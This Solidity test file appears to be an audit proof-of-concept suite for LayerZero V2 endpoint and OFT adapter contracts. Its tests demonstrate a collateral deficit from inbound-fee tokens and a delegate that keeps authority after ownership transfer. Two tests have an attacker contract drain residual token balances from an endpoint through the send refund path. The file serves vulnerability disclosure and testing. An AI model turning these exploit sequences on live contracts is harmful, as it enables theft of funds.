// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { EndpointV2 } from "../external/lz-evm-protocol-v2/contracts/EndpointV2.sol";
import { EndpointV2Alt } from "../external/lz-evm-protocol-v2/contracts/EndpointV2Alt.sol";
import { MessagingParams } from "../external/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { SimpleMessageLib } from "../external/lz-evm-protocol-v2/contracts/messagelib/SimpleMessageLib.sol";
import {
    ParityOFTAdapter,
    MockInboundFeeToken,
    DelegateActor,
    OwnerActor,
    MockLzToken,
    EndpointSendActor
} from "../src/ParitySupport.sol";

contract LayerZeroV2FullSourceParityTest {
    function _assertTrue(bool condition, string memory message) internal pure {
        require(condition, message);
    }

    /// @notice H1 full-source parity:
    /// upstream OFTAdapter debit path over-credits intent amount vs actual collateral for inbound-fee tokens.
    function test_h1_full_source_parity_oft_adapter_inbound_fee_collapse() public {
        EndpointV2 endpoint = new EndpointV2(101, address(this));
        MockInboundFeeToken token = new MockInboundFeeToken(address(this), 500); // 5% inbound fee
        ParityOFTAdapter adapter = new ParityOFTAdapter(address(token), address(endpoint), address(this));

        token.setFeeTarget(address(adapter));
        token.mint(address(this), 1_000_000 ether);
        token.approve(address(adapter), type(uint256).max);

        uint256 amount = 100_000 ether;
        (uint256 amountSentLD, uint256 amountReceivedLD) = adapter.debit(amount, amount, 202);

        uint256 collateral = token.balanceOf(address(adapter));
        _assertTrue(amountSentLD == amount, "unexpected amountSentLD");
        _assertTrue(amountReceivedLD == amount, "unexpected amountReceivedLD");
        _assertTrue(collateral == 95_000 ether, "expected 5% inbound fee haircut");
        _assertTrue(collateral < amountReceivedLD, "expected collateral deficit parity");
    }

    /// @notice H2 full-source parity:
    /// endpoint delegate authorization remains valid post ownership transfer until explicitly rotated.
    function test_h2_full_source_parity_stale_delegate_persists_post_transfer() public {
        EndpointV2 endpoint = new EndpointV2(303, address(this));
        MockInboundFeeToken token = new MockInboundFeeToken(address(this), 0);
        DelegateActor staleDelegate = new DelegateActor();
        OwnerActor newOwner = new OwnerActor();

        ParityOFTAdapter adapter = new ParityOFTAdapter(address(token), address(endpoint), address(staleDelegate));
        adapter.transferOwnership(address(newOwner));

        address blockedLib = endpoint.blockedLibrary();
        bool staleWriteSucceeded = staleDelegate.trySetSendLibrary(endpoint, address(adapter), 777, blockedLib);
        _assertTrue(staleWriteSucceeded, "expected stale delegate write to succeed before rotation");
        _assertTrue(
            endpoint.getSendLibrary(address(adapter), 777) == blockedLib,
            "expected blocked lib set by stale delegate"
        );

        newOwner.rotateDelegate(adapter, address(newOwner));
        bool staleWriteAfterRotation = staleDelegate.trySetSendLibrary(endpoint, address(adapter), 888, blockedLib);
        _assertTrue(!staleWriteAfterRotation, "expected stale delegate revoked after rotation");
    }

    /// @notice H3 full-source witness:
    /// if EndpointV2 holds residual lzToken balance, arbitrary caller can route that balance to self via send refund.
    function test_h3_full_source_endpoint_lztoken_residual_sweep() public {
        EndpointV2 endpoint = new EndpointV2(404, address(this));
        SimpleMessageLib msgLib = new SimpleMessageLib(address(endpoint), address(this));
        endpoint.registerLibrary(address(msgLib));
        endpoint.setDefaultSendLibrary(505, address(msgLib));
        endpoint.setDefaultReceiveLibrary(505, address(msgLib), 0);

        MockLzToken lzToken = new MockLzToken();
        endpoint.setLzToken(address(lzToken));

        // Simplify witness: zero native fee, nonzero lzToken fee.
        msgLib.setMessagingFee(0, 99);

        uint256 residual = 1_000;
        lzToken.mint(address(this), residual);
        lzToken.transfer(address(endpoint), residual);

        EndpointSendActor attacker = new EndpointSendActor();
        MessagingParams memory params = MessagingParams({
            dstEid: 505,
            receiver: bytes32(uint256(1)),
            message: hex"1234",
            options: "",
            payInLzToken: true
        });

        attacker.callSend(endpoint, params, payable(address(attacker)));

        // 99 consumed as fee to msgLib, all remaining residual refunded to attacker-selected address.
        _assertTrue(lzToken.balanceOf(address(msgLib)) == 99, "expected lzToken fee transfer");
        _assertTrue(lzToken.balanceOf(address(attacker)) == residual - 99, "expected residual sweep refund");
        _assertTrue(lzToken.balanceOf(address(endpoint)) == 0, "expected endpoint drained");
    }

    /// @notice H4 full-source witness:
    /// if EndpointV2Alt holds residual native-alt ERC20 balance, arbitrary caller can route it to self via send refund.
    function test_h4_full_source_endpoint_alt_native_residual_sweep() public {
        MockLzToken altToken = new MockLzToken();
        EndpointV2Alt endpoint = new EndpointV2Alt(606, address(this), address(altToken));
        SimpleMessageLib msgLib = new SimpleMessageLib(address(endpoint), address(this));
        endpoint.registerLibrary(address(msgLib));
        endpoint.setDefaultSendLibrary(707, address(msgLib));
        endpoint.setDefaultReceiveLibrary(707, address(msgLib), 0);

        // Force fee payment to use "native" alt ERC20 path.
        msgLib.setMessagingFee(77, 0);

        uint256 residual = 1_000;
        altToken.mint(address(this), residual);
        altToken.transfer(address(endpoint), residual);

        EndpointSendActor attacker = new EndpointSendActor();
        MessagingParams memory params = MessagingParams({
            dstEid: 707,
            receiver: bytes32(uint256(2)),
            message: hex"beef",
            options: "",
            payInLzToken: false
        });

        attacker.callSend(endpoint, params, payable(address(attacker)));

        // 77 consumed as fee to msgLib, remaining residual refunded to attacker-selected address.
        _assertTrue(altToken.balanceOf(address(msgLib)) == 77, "expected alt native fee transfer");
        _assertTrue(altToken.balanceOf(address(attacker)) == residual - 77, "expected residual sweep refund");
        _assertTrue(altToken.balanceOf(address(endpoint)) == 0, "expected endpoint drained");
    }
}
